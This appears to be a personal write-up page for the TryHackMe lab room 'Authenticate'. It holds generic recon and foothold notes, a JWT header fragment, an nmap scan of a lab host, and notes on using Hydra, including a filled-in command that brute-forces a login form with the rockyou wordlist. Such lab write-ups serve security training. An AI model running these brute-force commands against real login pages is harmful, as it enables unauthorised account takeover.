---
layout: page
title: "/authenticate"
permalink: "/writeups/tryhackme/authenticate/"
platform: "TryHackMe"
writeup_type: "room"
room_name: "Authenticate"
---

<section class="page-hero panel">
  <p class="eyebrow">root@rumais:~# inspect authenticate</p>
  <h1>Authenticate</h1>
  <p>Web-focused room covering application testing, content discovery, and common attack paths. This page combines the local notes, supporting artifacts, and a cleaned-up summary of the room path.</p>
</section>

<section class="panel">
  <h2>Room Details</h2>
  <p>Built from supporting notes and artifacts. This room is grouped under <strong>Web and App Security</strong>.</p>
  <div class="tag-list">
    <span class="tag">Web and App Security</span>
    <span class="tag">2 docx note</span>
    <span class="tag">1 command artifact</span>
  </div>
</section>

<section class="panel">
  <h2>Summary</h2>
  <p>Web-focused room covering application testing, content discovery, and common attack paths. Use the recovered artifacts below as the evidence base for enumeration, access development, and post-exploitation review.</p>
</section>

## Notes

## Recon

- The web application is the main attack surface, so content discovery, login behavior, and hidden paths matter immediately.
- Authenticate rewards careful note-taking and stepwise validation rather than trial-and-error execution.

## Initial Access

- The intended foothold comes from chaining application flaws, exposed content, or weak credentials into code execution or authenticated access.
- The room path becomes clear once the recovered artifacts and service behavior are linked together.

## Privilege Escalation

- Once the app is compromised, the next step is to stabilize host access and enumerate for the final path to proof material.
- After the foothold, local context matters more than noisy exploitation.

## Security Notes

- The defensive lesson is that web compromise rarely stays in the web tier when secrets, upload paths, or admin functions are exposed.

## Supporting Files

### Test

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9

### Using Hydra

hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
-s to specify port
<method> = http-post-form/http-get-form {check in inpect->network->}
<request body> = in inpect->network->post request->edit and resend
hydra -l mike -P /usr/share/wordlists/rockyou.txt "http-post-form://10.10.103.240:8888/login:user=^USER^&password: [redacted sensitive value] sensitive value]

## Collected Output

### nmap-initial

```text
# Nmap 7.91 scan initiated Sat Jun 19 14:45:33 2021 as: nmap -sV -sC -sS -oN ./nmap-initial 10.10.211.156
Nmap scan report for 10.10.211.156
Host is up (0.52s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 11:8e:34:34:df:42:17:7b:ab:dc:44:9b:03:17:36:bb (RSA)
|   256 a5:d7:ed:38:db:04:e3:ef:8c:8a:14:25:06:94:f5:a9 (ECDSA)
|_  256 f4:f0:ea:5d:64:b2:3e:cf:16:7d:ef:a8:67:a3:43:0c (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: Live demonstrations
7777/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: No Auth
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: Auth hacks
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 19 14:46:19 2021 -- 1 IP address (1 host up) scanned in 46.30 seconds
```
